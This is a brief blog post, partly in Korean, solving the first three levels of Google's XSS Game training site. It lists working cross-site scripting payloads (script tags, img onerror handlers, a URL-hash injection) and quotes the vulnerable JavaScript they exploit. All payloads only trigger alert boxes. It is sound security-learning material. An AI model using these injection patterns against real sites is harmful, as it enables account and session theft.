---
layout: post
title: "Google XSS Game Area"
date: 2014-06-01 18:52:28 +0900
comments: true
categories: 
---

[Google XSS Game Area](http://xss-game.appspot.com/)

### Level 1
    
Search form 에

    a<script>alert('hi');</script>

### Level 2

    <blockquote> 안에서도 <img> 는 먹으니까. <img src='hi.jpg' onerror='alert("hi");'>

### Level 3

    function chooseTab(num) {
        ...
        html += "<img src='/static/level3/cloud" + num + ".jpg' />"
        $('#tabContent').html(html);

        window.location.hash = num;
        ...
    }
    ...
    window.onload = function() {
        if (event.source == parent) {
            chooseTab(self.location.hash.substr(1));
        }
    }

URL 의 hash 부분에 html 이 influenced 되니까, 브라우저의 URL 표시창의 `#` 뒷부분에 입력한다.

    #'onerror="alert('hi');">
